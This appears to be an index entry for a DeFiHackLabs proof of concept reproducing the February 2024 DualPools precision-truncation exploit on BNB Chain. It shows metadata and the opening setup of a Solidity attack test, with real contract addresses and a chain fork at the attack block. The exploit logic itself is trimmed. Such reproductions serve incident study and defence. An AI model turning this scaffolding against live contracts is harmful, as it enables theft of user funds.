# [?] DualPools - precision truncation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: DualPools
Published: 2024-02-15
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/DualPools_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~42k
References:
- https://lunaray.medium.com/dualpools-hack-analysis-5209233801fa

```solidity
contract ContractTest is Test {
    WETH9 private WBNB = WETH9(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private LINK = IERC20(0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD);
    IERC20 private BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IERC20 private ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IERC20 private ADA = IERC20(0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47);

    VBep20Interface private vLINK = VBep20Interface(0x650b940a1033B8A1b1873f78730FcFC73ec11f1f);
    VBep20Interface private vBUSD = VBep20Interface(0xfD5840Cd36d94D7229439859C0112a4185BC0255);
    VBep20Interface private vWBNB = VBep20Interface(0xA07c5b74C9B40447a954e1466938b865b6BBea36);

    VBep20Interface private dLINK = VBep20Interface(0x8fBCC81E5983d8347495468122c65E2Dc274eed9);
    VBep20Interface private dBTCB = VBep20Interface(0xB51F589BD9f69a0089c315521EE2FC848bAB6C0c);
    VBep20Interface private dWBNB = VBep20Interface(0xB5aAaCcFd69EA45b1A5Aa7E9c7a5e0DB2ce4357e);
    VBep20Interface private dETH = VBep20Interface(0x5F4a5252880b393a8cc4c01bBA4486Cf7a76075A);
    VBep20Interface private dADA = VBep20Interface(0xb2cf43E119BFC41554c4445f1867dc9F4cf69deD);
    VBep20Interface private dBUSD = VBep20Interface(0x514e2A29e98D49C676c93c5805cb83891CE6a9F5);

    IMarketFacet VenusProtocol = IMarketFacet(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IMarketFacet Dualpools = IMarketFacet(0x5E5e28029eF37fC97ffb763C4aC1F532bbD4C7A2);

    IDPPOracle DPPOracle_0x1b52 = IDPPOracle(0x1B525b095b7353c5854Dbf6B0BE5Aa10F3818FaC);
    IDPPOracle DPPOracle_0x8191 = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);

    IPancakePair pancakeSwap = IPancakePair(0x824eb9faDFb377394430d2744fa7C42916DE3eCe); // LINK-WBNB
    Uni_Pair_V3 pool = Uni_Pair_V3(0x172fcD41E0913e95784454622d1c3724f546f849);

    function setUp() public {
        vm.createSelectFork("bsc", 36_145_772 - 1);
        vm.label(address(this), "AttackContract");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(LINK), "LINK");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/DualPools_exp.sol_
